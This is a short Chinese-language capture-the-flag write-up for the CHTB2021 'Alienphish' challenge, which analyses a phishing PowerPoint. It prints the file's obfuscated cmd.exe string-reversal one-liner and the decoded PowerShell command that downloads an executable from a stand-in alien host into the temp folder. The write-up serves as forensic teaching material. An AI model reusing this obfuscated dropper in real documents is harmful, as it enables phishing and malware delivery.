CHTB2021-Alienphish
===
## Info
**題目敘述**

The PowerPoint presentation was sent to the top leadership of the human resistance effort. We believe it was an attempt by the aliens to phish into our networks. Find the malicious payload and the flag.

**能力**
- Office
- powershell

**難易度**
★★☆☆☆

###### tags: `CTF-WRITEUP`

## Write Up
### 檔案分析
這是一個powerpoint的檔案，打開畫面會看到題目題是要按`F5`，並且Enable某項功能

![](https://i.imgur.com/sWpPWUO.png)

實際按`F5`播放會出現以下畫面，可以知道動作設定裡包含外部程式

![](https://i.imgur.com/6AYgkrx.png)

到「動作設定」中，查看外部程式

![](https://i.imgur.com/8ggwIwD.png)

### powershell
```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```
將`yM`做字串反轉，
- 下載`http:/destroyearth.alien/x.exe`
- 另存成`Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe`
    - 將檔名base64 decode即為flag
```
$o = $env:temp + 'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o
```